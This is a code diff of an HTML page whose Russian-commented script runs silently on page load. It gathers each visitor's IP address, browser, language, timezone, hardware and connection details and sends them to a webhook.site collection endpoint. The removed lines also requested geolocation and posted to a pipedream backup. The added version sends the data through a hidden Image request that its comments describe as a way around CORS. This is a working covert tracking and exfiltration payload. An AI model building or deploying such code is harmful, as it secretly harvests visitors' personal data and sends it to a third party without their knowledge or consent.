@@ -28,86 +28,23 @@
             debugEl.innerHTML += `<p>${new Date().toLocaleTimeString()}: ${message}</p>`;
         }
 
-        // 1. Получение IP (рабочий CORS-совместимый метод)
+        // 1. Получение IP через CORS-совместимый сервис
         async function getIP() {
             try {
                 debugLog("Получаем IP адрес...");
-                const response = await fetch('https://api.ipify.org?format=json');
+                const response = await fetch('https://api.db-ip.com/v2/free/self');
                 const data = await response.json();
-                debugLog(`IP получен: ${data.ip}`);
-                return data.ip;
+                debugLog(`IP получен: ${data.ipAddress}`);
+                return data.ipAddress;
             } catch (error) {
                 debugLog("Ошибка получения IP: " + error.message);
                 return "unknown";
             }
         }
 
-        // 2. Альтернативный метод геолокации (без CORS ошибок)
-        async function getGeoData(ip) {
-            if (ip === "unknown") return null;
-            
-            try {
-                debugLog("Пробуем Geolocation API...");
-                return await new Promise((resolve) => {
-                    if (!navigator.geolocation) {
-                        resolve(null);
-                        return;
-                    }
-                    
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            resolve({
-                                source: "browser_geolocation",
-                                lat: position.coords.latitude,
-                                lon: position.coords.longitude
-                            });
-                        },
-                        (error) => {
-                            debugLog("Geolocation error: " + error.message);
-                            resolve(null);
-                        },
-                        { timeout: 5000 }
-                    );
-                });
-            } catch (error) {
-                debugLog("Ошибка геолокации: " + error.message);
-                return null;
-            }
-        }
-
-        // 3. Надежная отправка данных
-        async function sendData(data) {
-            const fallbackUrls = [
-                'https://webhook.site/ddd4aa2b-23c4-4d6e-a6d7-b1fc40240a85',
-                'https://eo1fwpqj4jdtwvx.m.pipedream.net' // резервный webhook
-            ];
-            
-            for (const url of fallbackUrls) {
-                try {
-                    debugLog(`Пробуем отправить на ${url}...`);
-                    const response = await fetch(url, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(data)
-                    });
-                    
-                    if (response.ok) {
-                        debugLog("Данные успешно отправлены!");
-                        return true;
-                    }
-                } catch (error) {
-                    debugLog(`Ошибка отправки (${url}): ${error.message}`);
-                }
-            }
-            return false;
-        }
-
-        // 4. Сбор всех данных
-        async function collectAllData() {
-            const ip = await getIP();
-            const geoData = await getGeoData(ip);
-            
-            const result = {
+        // 2. Сбор данных без внешних API (только то, что доступно)
+        function collectBasicData(ip) {
+            return {
                 meta: {
                     timestamp: new Date().toISOString(),
                     url: window.location.href,
@@ -121,24 +58,37 @@
                     language: navigator.language,
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     cpuCores: navigator.hardwareConcurrency || "unknown",
-                    deviceMemory: navigator.deviceMemory || "unknown"
-                },
-                location: geoData,
-                network: {
+                    deviceMemory: navigator.deviceMemory || "unknown",
                     online: navigator.onLine,
                     connectionType: navigator.connection?.effectiveType || "unknown"
                 }
             };
-
-            debugLog("Финальные данные:\n" + JSON.stringify(result, null, 2));
-            await sendData(result);
         }
 
-        // Запуск при загрузке
-        window.addEventListener('DOMContentLoaded', () => {
+        // 3. Отправка через Image (обход CORS)
+        function sendData(data) {
+            try {
+                debugLog("Отправка данных...");
+                const encodedData = encodeURIComponent(JSON.stringify(data));
+                new Image().src = `https://webhook.site/ddd4aa2b-23c4-4d6e-a6d7-b1fc40240a85?data=${encodedData}`;
+                debugLog("Данные отправлены (метод Image)");
+            } catch (error) {
+                debugLog("Ошибка отправки: " + error.message);
+            }
+        }
+
+        // 4. Основной процесс
+        async function main() {
             debugLog("Начало работы скрипта...");
-            collectAllData();
-        });
+            const ip = await getIP();
+            const collectedData = collectBasicData(ip);
+            
+            debugLog("Собранные данные:\n" + JSON.stringify(collectedData, null, 2));
+            sendData(collectedData);
+        }
+
+        // Запуск
+        window.addEventListener('DOMContentLoaded', main);
     </script>
 </body>
 </html>
